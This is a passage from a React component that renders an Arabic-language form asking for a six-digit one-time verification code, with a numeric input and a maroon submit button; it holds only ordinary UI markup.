              <form onSubmit={handleStep6} className="space-y-5">
                <div className="space-y-2">
                  <Label htmlFor="otp">رمز التحقق <span className="text-red-500">*</span></Label>
                  <Input
                    id="otp"
                    name="one-time-code"
                    value={otp}
                    onChange={e => setOtp(e.target.value.replace(/\D/g, ''))}
                    placeholder="أدخل الرمز المكوّن من 6 أرقام"
                    className="h-11 text-center text-xl font-mono tracking-widest"
                    autoComplete="one-time-code"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    maxLength={6}
                  />
                </div>
                <Button type="submit" disabled={loading} className="w-full h-12 rounded-full bg-[#8A1538] hover:bg-[#6d1030]">
                  {loading ? 'جاري التحقق...' : 'تأكيد الرمز'}
                </Button>
              </form>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  )
}
